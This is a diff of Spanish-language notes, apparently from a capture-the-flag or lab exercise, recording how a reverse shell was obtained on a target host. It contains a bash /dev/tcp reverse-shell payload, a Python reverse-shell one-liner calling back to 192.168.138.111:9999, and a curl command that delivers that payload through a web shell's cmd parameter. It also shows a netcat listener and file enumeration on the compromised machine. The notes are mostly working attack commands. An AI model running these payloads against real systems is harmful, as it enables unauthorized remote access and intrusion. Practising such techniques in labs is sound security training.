@@ -74,9 +74,14 @@ styles.css
 intentare poner una reverse shell : 
 
 listener : nc -lvnp 9999
-payload : sh -i >& /dev/tcp/192.168.138.111/9001 0>&1
+payload : python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.138.111",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+
 
 recibi una respuestaen el listener : 
+
+[davidoberst@archlinux ~]$ curl -g 'http://10.66.169.120/assets/index.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22192.168.138.111%22%2C9999))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)%27'
+
+
 
 [davidoberst@archlinux ~]$ nc -lvnp 9999
 Listening on 0.0.0.0 9999
@@ -124,3 +129,12 @@ user.txt
 $ cat user.txt
 cat user.txt
 cat: user.txt: Permission denied
+
+
+.bashrc
+.logout
+.profile
+
+.local directory
+oneforall
+yuei
